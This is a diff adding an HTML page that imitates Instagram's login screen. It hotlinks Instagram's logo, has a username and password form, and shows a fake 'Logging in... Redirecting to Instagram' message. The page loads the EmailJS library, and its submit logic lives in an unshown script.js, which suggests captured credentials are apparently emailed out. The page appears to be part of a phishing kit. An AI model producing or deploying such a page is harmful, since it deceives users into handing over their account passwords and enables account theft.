@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Instagram</title>
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+  <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <div class="logo">
+        <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" />
+      </div>
+
+      <form id="loginForm">
+        <input type="text" id="username" placeholder="Phone number, username, or email" required autofocus>
+        <input type="password" id="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+      </form>
+
+      <div class="or">OR</div>
+
+      <div class="signup-link">
+        Don't have an account? <a href="#">Sign up</a>
+      </div>
+    </div>
+
+    <div id="successModal" class="modal hidden">
+      <p>Logging in... Redirecting to Instagram.</p>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
